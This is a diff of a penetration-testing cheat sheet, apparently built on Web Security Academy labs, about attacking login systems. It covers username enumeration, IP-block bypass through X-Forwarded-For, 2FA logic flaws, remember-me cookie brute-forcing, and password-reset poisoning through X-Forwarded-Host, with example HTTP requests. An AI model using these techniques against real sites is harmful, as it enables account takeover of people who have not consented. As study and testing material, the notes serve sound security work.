@@ -2,12 +2,33 @@
 
 ## <mark style="color:yellow;">Usernames enumeration</mark>
 
-* Some username: `admin`, `administrator` ,`firstname.lastname@somecompany.com`
-* Compares responses between a valid user and an invalid user (and incorrect password). \[One character out of place makes the messages distinct, even if not visible on the page]
-* Create account and see if there's error like "account already exists"
-* Account locking? (after a certain number of trials). It could mean that the account exists
-* Response times (a website may only check the password if the username is valid) entering an excessively long password causes a noticeable delay
-* Check HTTP responses to see if any email addresses are disclosed
+#### 👤 Default username
+
+```
+admin
+administrator
+firstname.lastname@somecompany.co
+```
+
+#### 🖊️ Regisitration form&#x20;
+
+Create account and see if there's error like "account already exists".
+
+#### 🆚 Comparing responses
+
+Use a valid user and an invalid user (and incorrect password). One character out of place makes the messages distinct, even if not visible on the page.
+
+{% hint style="success" %}
+**Tip**: Use "Grep - match" in Burp Intruder to fetch the error message
+{% endhint %}
+
+#### 🔒 Account locking
+
+Try 3/5 login. If the account is locked, it could mean that there is.
+
+#### ⏱️ Response times
+
+A website may only check the password if the username is valid. So, entering an excessively long password causes a noticeable delay.
 
 ## <mark style="color:yellow;">Passwords</mark>
 
@@ -15,36 +36,50 @@
 
 ## <mark style="color:yellow;">Account locking</mark>
 
-* Guess password with locked account&#x20;
-  * With your account locked, send a request with an incorrect password and another with a correct password. Is the response different?
-* IP blocked?
-  * The failed attempts counter resets if the IP owner logs in successfully. (Make sure that concurrent requests is set to 1)&#x20;
-  * Try to bypass by adding `X-Forwarded-For` header
-* With password change
-  * See if you can change the password of an arbitrary user. Ex: look for a hidden username paramer (control it).  Brute-force password when you enter your current password.
-  * Tip: use your account and notice different behavior.
-    * current password: wrong, new-password-1=XXX, new-password-2=XXX
-    * current password: wrong, new-password-1=XXX, new-password-2=YYY
-    * current password: \<right>, new-password-1=XXX, new-password-2=XXX
-    * current password: \<right>, new-password-1=XXX, new-password-2=YYY
+#### 🔐 Guess password with locked account&#x20;
+
+With your account locked, send a request with an incorrect password and another with a correct password. Is the response different?
+
+#### 🛑➡️ IP blocked bypass
+
+* The failed attempts counter resets if the IP owner logs in successfully. (Make sure that concurrent requests is set to 1)&#x20;
+* Try to bypass by adding `X-Forwarded-For` header
+
+#### 🔑🔄 With password change
+
+See if you can change the password of an arbitrary user. E.g: look for a hidden username paramer (control it).  Brute-force password when you enter your current password.
+
+{% hint style="success" %}
+**Tip**: use your account and notice different behavior.
+
+* current password: wrong, new-password-1=XXX, new-password-2=XXX
+* current password: wrong, new-password-1=XXX, new-password-2=YYY
+* current password: \<right>, new-password-1=XXX, new-password-2=XXX
+* current password: \<right>, new-password-1=XXX, new-password-2=YYY
+{% endhint %}
 
 ## <mark style="color:yellow;">2FA</mark> <a href="#bypassing-two-factor-authentication" id="bypassing-two-factor-authentication"></a>
 
-* Brute-force
-* Bypassing two-factor authentication -> check if you can directly skip to "logged-in" pages
-* Flawed logic
+#### ⚔️ Brute-force OTP <a href="#brute-forcing-2fa-verification-codes" id="brute-forcing-2fa-verification-codes"></a>
 
-<pre class="language-http"><code class="lang-http"><strong># 1.1 step - Normal login with attacker account
+#### 🔓➡️ Bypassing two-factor authentication  <a href="#brute-forcing-2fa-verification-codes" id="brute-forcing-2fa-verification-codes"></a>
+
+Check if you can directly skip to "logged-in" pages.
+
+#### 🧠 Flawed logic <a href="#brute-forcing-2fa-verification-codes" id="brute-forcing-2fa-verification-codes"></a>
+
+<pre class="language-http"><code class="lang-http"><strong># 1 step - (REQUEST) Normal login with attacker account
 </strong>POST /login-steps/first HTTP/1.1
 Host: vulnerable-website.com
 [...]
 username=attacker&#x26;password=qwerty
+</code></pre>
 
-
-# 1.2 step - The server sets cookie
+```http
+# 1 step - (RESPONSE) The server sets cookie
 HTTP/1.1 200 OK
 Set-Cookie: account=attacker
-</code></pre>
+```
 
 ```http
 # 2 step - request two-factor
@@ -63,32 +98,39 @@ verification-code=123456
 
 ## <mark style="color:yellow;">Remember me option</mark>
 
-Some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp (or maybe even the password).
+Some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp (or maybe even the password). If the website uses salt it becomes much more complicated...
 
-* Study your cookie and deduce how it is generated
-* Sometimes this cookie is hashed or encoded (e.g. base64)
-* Now try to brute-force other users' cookies to gain access to their accounts
+#### 🧠 Study your cookie and deduce how it is generated
 
-If the website uses salt it becomes much more complicated...
+Sometimes this cookie is hashed or encoded (e.g. base64)
+
+#### ⚔️ Brute-force other users' cookies to gain access to their accounts
 
 ## <mark style="color:yellow;">Password reset</mark>
 
-* **Control username parameter**
-  * After you receive an email with the URL to reset your password, see if you can control username parameter.
-  * ```http
-    POST /forgot-pwd?temp-token=xxx HTTP/2
-    [...]
+#### 🔧 **Control username parameter**
 
-    user=<victim>&new-pwd-1=<whatever>&new-pwd-2=<whatever>&token=xxx
-    ```
-* **Resetting passwords using a URL (static token)**
-  * Poor implementation can use guessable parameter: E.g.: `http://vulnerable-website.com/reset-password?user=victim-user`
-* **Steal another user's token (for dynamic token)**
-  * Try adding the `X-Forwarded-Host` header and see if it allows you to control the link generated by the app. This way, you can insert your website's URL so that when the user clicks on the link, they are directed to `http://your.website.com/reset-password?token=impredictabletoken`.
-  * ```http
-    POST /forgot-password HTTP/2
-    Host: 0ad400fb039bb5ea816cac4d00be00a8.web-security-academy.net
-    X-Forwarded-Host: your.website.com
+After you receive an email with the URL to reset your password, see if you can control username parameter.
 
-    username=lebron
-    ```
+```http
+POST /forgot-pwd?temp-token=xxx HTTP/2
+[...]
+
+user=<victim>&new-pwd-1=<whatever>&new-pwd-2=<whatever>&token=xxx
+```
+
+#### 🔑🔒 **Resetting passwords using a URL (static token)** <a href="#resetting-passwords-using-a-url" id="resetting-passwords-using-a-url"></a>
+
+Poor implementation can use guessable parameter: E.g.: `http://vulnerable-website.com/reset-password?user=victim-user`
+
+#### 🕵️‍♂️⚡ **Steal another user's token (for dynamic token)** <a href="#resetting-passwords-using-a-url" id="resetting-passwords-using-a-url"></a>
+
+Add the `X-Forwarded-Host` header and see if it allows you to control the link generated by the app. This way, you can insert your website's URL so that when the user clicks on the link, they are directed to `http://your.website.com/reset-password?token=impredictabletoken`.
+
+```http
+POST /forgot-password HTTP/2
+Host: 0ad400fb039bb5ea816cac4d00be00a8.web-security-academy.net
+X-Forwarded-Host: your.website.com
+
+username=lebron
+```
